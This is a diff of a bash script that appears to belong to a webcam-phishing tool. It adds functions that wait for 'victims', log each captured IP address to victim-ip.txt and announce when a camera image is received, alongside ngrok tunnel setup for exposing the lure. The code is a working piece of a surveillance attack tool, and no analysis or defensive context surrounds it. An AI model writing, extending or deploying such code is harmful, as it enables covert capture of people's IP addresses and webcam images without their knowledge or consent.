@@ -72,6 +72,41 @@ banner
 menu
 fi
 }
+saveip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m IP:\e[0m\e[1;96m %s\e[0m\n" $ip
+cat ip.txt >> victim-ip.txt
+
+}
+victimfound() {
+
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Victims ,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "\n"
+while [ true ]; do
+
+if [[ -e "ip.txt" ]]; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
+saveip
+rm -rf ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e ".cam.log" ]]; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Received !!\e[0m\n"
+rm -rf .cam.log
+fi
+sleep 0.5
+
+done 
+
+}
+
 initialize_ngrok() {
 
 ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
